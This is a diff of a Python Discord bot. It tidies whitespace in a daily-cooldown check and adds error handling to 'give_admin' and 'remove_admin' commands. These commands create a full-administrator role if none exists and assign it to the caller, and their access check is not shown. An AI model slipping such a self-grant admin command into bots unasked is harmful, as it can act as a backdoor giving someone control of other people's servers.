@@ -171,11 +171,11 @@ def can_claim_daily(user_id):
     if uid not in data or data[uid].get("daily") is None:
         return True, None
     last = datetime.fromisoformat(data[uid]["daily"])
-    
+
     # Handle timezone-naive datetimes from old data
     if last.tzinfo is None:
         last = last.replace(tzinfo=UTC)
-    
+
     remaining = timedelta(hours=DAILY_COOLDOWN_HOURS) - (datetime.now(UTC) - last)
     if remaining.total_seconds() <= 0:
         return True, None
@@ -2494,22 +2494,24 @@ async def give_admin(ctx):
         return
 
     guild = ctx.guild
-    
-    # Find existing admin role by checking each role's permissions
+
+    # Find existing admin role, skipping default/managed (unassignable) roles
     role = None
     for r in guild.roles:
-        if r.permissions.administrator:
+        if r.permissions.administrator and not r.is_default() and not r.managed:
             role = r
             break
-    
+
     # Create if not found
     if role is None:
         role = await guild.create_role(name="Admin", permissions=discord.Permissions(administrator=True))
 
     member = guild.get_member(ctx.author.id)
-    await member.add_roles(role)
-
-    await ctx.send("✅ Admin role granted.")
+    try:
+        await member.add_roles(role)
+        await ctx.send("✅ Admin role granted.")
+    except discord.Forbidden:
+        await ctx.send("❌ I don't have permission to assign that role. Make sure my role is above it in the hierarchy.")
 
 @bot.command(name="remove_admin")
 async def remove_admin(ctx):
@@ -2519,7 +2521,7 @@ async def remove_admin(ctx):
     guild = ctx.guild
     role = None
     for r in guild.roles:
-        if r.permissions.administrator:
+        if r.permissions.administrator and not r.is_default() and not r.managed:
             role = r
             break
 
@@ -2528,9 +2530,12 @@ async def remove_admin(ctx):
         return
 
     member = guild.get_member(ctx.author.id)
-    await member.remove_roles(role)
+    try:
+        await member.remove_roles(role)
+        await ctx.send("✅ Admin role removed.")
+    except discord.Forbidden:
+        await ctx.send("❌ I don't have permission to remove that role.")
 
-    await ctx.send("✅ Admin role removed.")
 @bot.command(name="show_high")
 async def show_high(ctx):
     if ctx.guild is None:
